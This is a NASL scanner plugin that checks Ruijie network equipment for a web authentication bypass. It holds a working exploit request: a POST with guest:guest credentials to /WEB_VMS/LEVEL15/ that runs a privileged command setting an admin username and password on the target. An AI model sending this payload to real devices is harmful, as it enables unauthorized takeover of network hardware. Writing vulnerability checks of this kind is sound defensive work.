############################################################
# Author: shiyunshu
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799202);
 name = "Ruijie equipment - web authentication bypass - high";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family("CNLocal");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"Ruijie equipment web login interface sends sh run the switch through POST as user guest, and executes high authority command.");
 script_set_attribute(attribute:"solution", value:"It is recommended to modify the logic of command execution by different users, so as to avoid the execution of high authority commands by low authority users.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/WEB_VMS/LEVEL15/");
	req = http_send_recv3(method: "POST", port: port, item: url,  add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Authorization", "Basic Z3Vlc3Q6Z3Vlc3Q=","Cookie", "currentURL=; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=" ),data: "command=webmaster level 0 username admin password admin&strurl=config%04&mode=%02PRIV_EXEC&signname=Red-Giant.");
	if( req[2] == NULL) exit(0);
	con = url + req[1] + req[2];
	if( "200 ">< req[0] && ">Level was: LEVEL15<P>Mode was: /config/<P>Command was: webmaster level 0 username admin password admin" >< req[2] && '<INPUT TYPE=HIDDEN NAME=strurl VALUE="config' >< req[2]){
	  	if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/WEB_VMS/LEVEL15/");
	res = http_send_recv3(method: "POST", port: port, item: url,  add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Authorization", "Basic Z3Vlc3Q6Z3Vlc3Q=","Cookie", "currentURL=; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=" ),data: "command=webmaster level 0 username admin password admin&strurl=config%04&mode=%02PRIV_EXEC&signname=Red-Giant.");
	req = http_last_sent_request();
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = url + ssl_req;
	if( "200 O"><ssl_req && ">Level was: LEVEL15<P>Mode was: /config/<P>Command was: webmaster level 0 username admin password admin"><ssl_req && '<INPUT TYPE=HIDDEN NAME=strurl VALUE="config'><ssl_req){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}